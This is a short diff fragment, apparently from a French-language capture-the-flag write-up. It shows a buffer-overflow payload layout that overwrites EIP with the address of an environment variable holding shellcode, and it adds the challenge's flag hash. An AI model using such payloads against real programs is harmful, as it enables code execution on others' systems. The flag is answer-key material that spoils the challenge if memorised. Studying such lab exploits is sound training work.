@@ -569,3 +569,5 @@ echo 'int main() { printf("0x%x\n", getenv("SHELLCODE")); }' > /tmp/find.c && gc
 payload arg 1 : A * 20 (remplit le 1er buffer sans \0)
 payload arg 2 : B * 10 (padding jusqu'à EIP) + adresse de la var d'environnement + C * 6 (pour finir les 20 char)
 ```
+
+# flag cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
